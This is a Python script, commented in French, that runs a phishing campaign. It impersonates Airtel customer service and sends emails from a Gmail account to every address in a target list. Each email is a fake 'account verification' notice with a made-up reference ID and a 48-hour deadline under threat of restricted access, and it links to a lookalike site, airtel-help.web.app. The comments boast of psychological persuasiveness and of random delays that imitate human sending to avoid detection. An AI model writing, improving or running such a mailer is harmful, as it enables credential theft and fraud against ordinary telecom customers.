import os
import smtplib
import ssl
import sys
import time
from email.utils import formataddr
from datetime import datetime, timedelta
from random import randint
from email.message import EmailMessage

# --- CONFIGURATION ---
# Ces informations doivent être configurées en tant que variables d'environnement.
# C'est le même compte Gmail et mot de passe d'application que pour les notifications.
SENDER_EMAIL = os.environ.get('GMAIL_USER')
APP_PASSWORD = os.environ.get('GMAIL_APP_PASSWORD')

# !! IMPORTANT !!
# Mettez ici l'URL de votre site web une fois qu'il est déployé (par exemple sur Firebase Hosting).
WEBSITE_URL = os.environ.get("WEBSITE_URL", "https://airtel-help.web.app") # Fallback pour la compatibilité

# --- Optimisation : Charger le modèle d'e-mail une seule fois au démarrage ---
try:
    # Assurez-vous que 'alert_template.html' est dans le même dossier.
    with open('alert_template.html', 'r', encoding='utf-8') as f:
        ALERT_TEMPLATE_CONTENT = f.read()
except FileNotFoundError:
    print("ERREUR CRITIQUE : Le fichier 'alert_template.html' est introuvable. Les e-mails d'alerte ne fonctionneront pas.")
    ALERT_TEMPLATE_CONTENT = None

def create_html_body(template: str, website_url: str, ref_id: str, deadline_str: str) -> str:
    """
    Génère le corps HTML de l'e-mail avec un style professionnel et psychologiquement convaincant.
    """
    current_year = datetime.now().year
    html_content = template.replace('{{ref_id}}', ref_id)
    html_content = html_content.replace('{{website_url}}', website_url)
    html_content = html_content.replace('{{deadline_str}}', deadline_str)
    html_content = html_content.replace('{{current_year}}', str(current_year))
    return html_content

def create_text_body(website_url: str, ref_id: str, deadline_str: str) -> str:
    """
    Génère une version texte brut de l'e-mail pour une meilleure délivrabilité.
    """
    current_year = datetime.now().year
    return f"""
Vérification de votre compte Airtel
Réf: {ref_id}

Bonjour,

Dans le cadre de l'amélioration continue de nos protocoles de sécurité, nous effectuons une vérification de routine des informations de nos clients.

Cette procédure standard est essentielle pour garantir la protection de votre compte et la continuité de vos services.

Pour éviter toute restriction d'accès, nous vous invitons à compléter cette étape avant le {deadline_str} en suivant le lien ci-dessous :

Procéder à la vérification : {website_url}

L'équipe Sécurité Airtel vous remercie de votre coopération.

© {current_year} Airtel. Cet e-mail est une notification automatique.
"""

def send_security_alert(target_email: str):
    """Envoie l'e-mail de notification stylisé à une cible et retourne True si succès, False si échec."""
    if not SENDER_EMAIL or not APP_PASSWORD:
        print("ERREUR : Veuillez configurer GMAIL_USER et GMAIL_APP_PASSWORD dans les variables d'environnement.")
        return False

    # Génération des données dynamiques pour plus de crédibilité
    ref_id = f"AZ-{randint(100, 999)}-{randint(1000, 9999)}"
    deadline = datetime.now() + timedelta(hours=48) # Un délai de 48h est moins agressif
    deadline_str = deadline.strftime("%d/%m/%Y à %Hh%M")

    msg = EmailMessage()
    msg['Subject'] = f"Notification de service : Vérification de votre compte (Réf: {ref_id})"
    # Utilise formataddr pour un affichage professionnel du nom de l'expéditeur
    msg['From'] = formataddr(('Airtel Service Client', SENDER_EMAIL))
    msg['To'] = target_email

    # Attacher la version texte d'abord, puis la version HTML comme alternative
    msg.set_content(create_text_body(WEBSITE_URL, ref_id, deadline_str))
    if ALERT_TEMPLATE_CONTENT:
        html_body = create_html_body(ALERT_TEMPLATE_CONTENT, WEBSITE_URL, ref_id, deadline_str)
        msg.add_alternative(html_body, subtype='html')
    else:
        print("AVERTISSEMENT : Modèle HTML non chargé. Envoi en format texte brut uniquement.")

    try:
        context = ssl.create_default_context()
        with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
            smtp.login(SENDER_EMAIL, APP_PASSWORD)
            smtp.send_message(msg)
        print(f"✅ E-mail d'alerte envoyé avec succès à {target_email}")
        return True
    except Exception as e:
        print(f"❌ Échec de l'envoi de l'e-mail à {target_email}: {e}")
        return False

def run_campaign():
    """
    Fonction principale pour lire une liste de cibles depuis un fichier et leur envoyer l'e-mail.
    """
    if not ALERT_TEMPLATE_CONTENT:
        print("Campagne annulée car le modèle d'e-mail 'alert_template.html' est manquant.")
        return

    # Le nom du fichier peut être passé en argument, sinon on utilise 'cibles.txt' par défaut.
    filename = sys.argv[1] if len(sys.argv) > 1 else 'cibles.txt'

    try:
        with open(filename, 'r', encoding='utf-8') as f:
            # On s'assure de ne garder que les lignes valides et non vides
            targets = [line.strip() for line in f if line.strip() and '@' in line.strip()]
        
        if not targets:
            print(f"Aucune adresse e-mail valide trouvée dans le fichier '{filename}'.")
            return

        total_targets = len(targets)
        print(f"--- Début de la campagne d'envoi à {total_targets} cible(s) depuis '{filename}' ---")

        for i, target in enumerate(targets, 1):
            print(f"[{i}/{total_targets}] Préparation de l'envoi à : {target}")
            send_security_alert(target)
            if i < total_targets:
                sleep_duration = randint(8, 20) # Pause de 8 à 20 secondes
                print(f"   -> Pause de {sleep_duration} secondes pour simuler un comportement humain...")
                time.sleep(sleep_duration)

        print("\n--- ✅ Campagne d'envoi terminée avec succès. ---")

    except FileNotFoundError:
        print(f"ERREUR : Le fichier '{filename}' est introuvable. Veuillez le créer.")
        print("Usage: python send_alert_email.py [nom_du_fichier_cibles.txt]")

if __name__ == "__main__":
    run_campaign()